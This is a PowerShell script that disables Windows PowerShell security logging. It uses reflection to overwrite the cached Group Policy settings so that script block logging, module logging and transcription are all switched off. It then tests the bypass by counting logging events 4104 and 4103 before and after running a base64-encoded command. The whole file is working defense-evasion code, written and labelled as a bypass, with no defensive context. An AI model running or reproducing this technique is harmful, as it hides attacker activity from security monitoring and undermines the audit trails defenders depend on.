function Disable-PSLoggingGPO {
    try {
        Write-Host "Applying GPO Cache Modification..."
        
        # Get the GPO settings field
        $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
        
        if ($GroupPolicySettingsField -ne $null) {
            $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
            
            if ($GroupPolicySettings -ne $null) {
                # Show current settings (optional, for debug)
                Write-Host "Current ScriptBlockLogging settings:"
                $sbKey = "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
                if ($GroupPolicySettings.ContainsKey($sbKey)) {
                    Write-Host $GroupPolicySettings[$sbKey]
                } else {
                    Write-Host "ScriptBlockLogging key not found (normal if not set)"
                }
                
                # Create explicit Dictionary for ScriptBlockLogging
                $sbDict = [Collections.Generic.Dictionary[String,Object]]::new()
                $sbDict.Add("EnableScriptBlockLogging", "0")
                $sbDict.Add("EnableScriptBlockInvocationLogging", "0")
                $GroupPolicySettings[$sbKey] = $sbDict
                
                # Create explicit Dictionary for ModuleLogging
                $modKey = "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
                $modDict = [Collections.Generic.Dictionary[String,Object]]::new()
                $modDict.Add("EnableModuleLogging", "0")
                $modDict.Add("ModuleNames", "")
                $GroupPolicySettings[$modKey] = $modDict
                
                # Create explicit Dictionary for Transcription
                $transKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription"
                $transDict = [Collections.Generic.Dictionary[String,Object]]::new()
                $transDict.Add("EnableTranscripting", "0")
                $GroupPolicySettings[$transKey] = $transDict
                
                # Refresh modules to apply changes
                Import-Module Microsoft.PowerShell.Utility -Force
                
                Write-Host "SUCCESS: GPO cache modified for ScriptBlock, Module, and Transcription logging!"
                return $true
            } else {
                Write-Host "FAILED: cachedGroupPolicySettings is null"
                return $false
            }
        } else {
            Write-Host "FAILED: Could not access cachedGroupPolicySettings field"
            return $false
        }
        
    } catch {
        Write-Host "ERROR: $($_.Exception.Message)"
        Write-Host "Stack trace: $($_.ScriptStackTrace)"
        return $false
    }
}

# Test GPO bypass
Write-Host "Testing GPO Cache Bypass..."

# Count events before
$before_4104 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} -ErrorAction SilentlyContinue | Measure-Object).Count
$before_4103 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4103} -ErrorAction SilentlyContinue | Measure-Object).Count

Write-Host "Events before bypass - 4104: $before_4104, 4103: $before_4103"

# Apply bypass
$success = Disable-PSLoggingGPO

if ($success) {
    # Test with complex PowerShell commands (fixed: direct execution, no Invoke-Expression)
    Write-Host "Executing complex test commands..."
    
    # Fixed: Direct Get-Process filter (no escape issue)
    Get-Process | Where-Object { $_.ProcessName -eq 'explorer' } | Out-Null
    
    # Encoded command
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Host 'Hidden command'"))
    powershell -enc $encoded | Out-Null  # Pipe to Out-Null to suppress output noise
    
    # Wait and check results
    Start-Sleep 3
    
    $after_4104 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} -ErrorAction SilentlyContinue | Measure-Object).Count
    $after_4103 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4103} -ErrorAction SilentlyContinue | Measure-Object).Count
    
    Write-Host "Events after bypass - 4104: $after_4104, 4103: $after_4103"
    
    $diff_4104 = $after_4104 - $before_4104
    $diff_4103 = $after_4103 - $before_4103
    
    Write-Host "NEW events generated - 4104: $diff_4104, 4103: $diff_4103"
    
    if ($diff_4104 -eq 0 -and $diff_4103 -eq 0) {
        Write-Host "SUCCESS: No PowerShell events logged!"
    } else {
        Write-Host "PARTIAL SUCCESS: Some events still logged"
    }
} else {
    Write-Host "Bypass failed - skipping tests"
}